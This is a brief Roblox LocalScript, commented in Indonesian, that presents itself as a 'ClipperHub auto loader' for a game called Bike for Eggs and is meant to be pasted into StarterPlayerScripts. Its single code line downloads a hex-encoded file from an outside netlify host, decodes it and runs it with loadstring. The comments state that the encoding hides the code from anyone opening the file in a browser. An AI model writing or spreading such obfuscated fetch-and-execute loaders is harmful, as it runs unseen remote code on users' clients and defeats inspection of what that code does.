-- [LocalScript] | Lokasi: StarterPlayer > StarterPlayerScripts (paste sebagai LocalScript)
-- ClipperHub auto loader: ambil file .hex, dekode, lalu jalankan.
-- File .hex tidak terbaca sebagai Lua kalau dibuka di browser, tapi tetap jalan di Roblox.
loadstring((game:HttpGet("https://bikeforeggs-loader.netlify.app/BikeForEggsMobile_v5_2.hex"):gsub("%s+", ""):gsub("%x%x", function(h) return string.char(tonumber(h, 16)) end)))()
